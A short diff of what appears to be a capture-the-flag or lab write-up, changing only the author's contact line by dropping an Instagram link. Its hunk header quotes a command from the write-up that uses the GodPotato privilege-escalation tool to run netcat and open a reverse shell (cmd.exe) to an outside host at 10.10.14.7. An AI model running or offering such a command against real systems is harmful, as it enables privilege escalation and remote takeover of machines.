@@ -301,7 +301,7 @@ PS C:\temp> ./GodPotato-NET4.exe -cmd "C:\temp\nc.exe -e cmd.exe 10.10.14.7 5555
 
 Nice !!
 
-If you have any questions, you can dm me on [instagram](https://instagram.com/eliott.la) or on discord at : 'ethicxz.'
+If you have any questions you can dm me on discord : 'ethicxz.'
 
 
 
